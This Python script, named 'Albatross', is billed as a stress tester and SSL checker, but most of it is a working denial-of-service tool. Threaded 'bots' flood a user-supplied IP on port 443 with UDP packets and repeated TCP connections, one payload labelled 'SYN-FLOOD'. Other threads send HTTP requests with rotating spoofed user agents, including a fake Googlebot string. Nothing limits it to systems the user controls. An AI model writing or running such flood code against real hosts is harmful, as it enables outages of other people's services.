import socket
import threading
import time
from datetime import datetime
import ssl
import csv
import random
from urllib.parse import urlparse
import requests
import argparse
import os

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
]

def udp_bot(bot_id, ip, port, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    msg = b"A" * 1024
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            client.sendto(msg, (ip, port))
            print(f"[UDP-Bot-{bot_id}] Sent UDP packet at {datetime.utcnow().isoformat()}")
        except Exception as e:
            print(f"[UDP-Bot-{bot_id}] Error: {e}")
    client.close()

def tcp_bot(bot_id, ip, port, duration):
    msg = b"SYN-FLOOD"
    end_time = time.time() + duration
    while time.time() < end_time:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(2)
                sock.connect((ip, port))
                sock.sendall(msg)
                print(f"[TCP-Bot-{bot_id}] Sent TCP packet at {datetime.utcnow().isoformat()}")
        except Exception as e:
            print(f"[TCP-Bot-{bot_id}] Error: {e}")

def get_ssl_info(hostname):
    try:
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443), timeout=5) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                issuer = dict(x[0] for x in cert['issuer'])
                not_after = cert['notAfter']
                return issuer.get('organizationName', 'Unknown'), not_after
    except Exception:
        return 'Unknown', 'Unknown'

def check_http(url, user_agent):
    try:
        headers = {'User-Agent': user_agent}
        start = time.time()
        response = requests.get(url, headers=headers, timeout=5)
        end = time.time()
        return response.status_code, int((end - start) * 1000)
    except Exception as e:
        print(f"HTTP check failed: {e}")
        return -1, -1

def ssl_http_bot(bot_id, url, duration_sec, results):
    parsed = urlparse(url)
    hostname = parsed.hostname

    end_time = time.time() + duration_sec
    while time.time() < end_time:
        user_agent = random.choice(USER_AGENTS)
        ssl_issuer, ssl_expiry = get_ssl_info(hostname)
        http_status, latency = check_http(url, user_agent)

        now = datetime.utcnow().isoformat()
        results.append([
            bot_id, now, ssl_issuer, ssl_expiry, http_status, latency, user_agent
        ])
        print(f"[Bot-{bot_id}][{now}] SSL: {('OK' if ssl_issuer != 'Unknown' else 'FAIL')} "
              f"(Issuer: {ssl_issuer}, Expiry: {ssl_expiry}), HTTP: {('OK' if http_status > 0 else 'FAIL')} "
              f"({latency}ms), UA: {user_agent}")

def write_csv(filename, rows):
    with open(filename, mode='w', newline='') as f:
        writer = csv.writer(f)
        writer.writerow(["Bot ID", "Timestamp", "SSL Issuer", "SSL Expiry", "HTTP Status", "Latency (ms)", "User-Agent"])
        writer.writerows(rows)

def main():
    parser = argparse.ArgumentParser(description="Albatross - Combined Stress Tester and SSL Checker")
    parser.add_argument("--ip", required=True, help="Target IP/domain for UDP/TCP flood")
    parser.add_argument("--url", required=True, help="URL to check SSL and HTTP")
    parser.add_argument("--duration", type=int, default=60, help="Test duration in seconds")
    parser.add_argument("--out", default="results.csv", help="Output CSV file for SSL/HTTP results")
    args = parser.parse_args()

    threads = []
    results = []

    # Launch UDP & TCP stress bots
    for i in range(3):
        threads.append(threading.Thread(target=udp_bot, args=(i+1, args.ip, 443, args.duration)))
        threads.append(threading.Thread(target=tcp_bot, args=(i+1, args.ip, 443, args.duration)))

    # Launch SSL/HTTP check bots
    for i in range(5):
        threads.append(threading.Thread(target=ssl_http_bot, args=(i+1, args.url, args.duration, results)))

    for t in threads:
        t.start()
    for t in threads:
        t.join()

    write_csv(args.out, results)

if __name__ == "__main__":
    main()
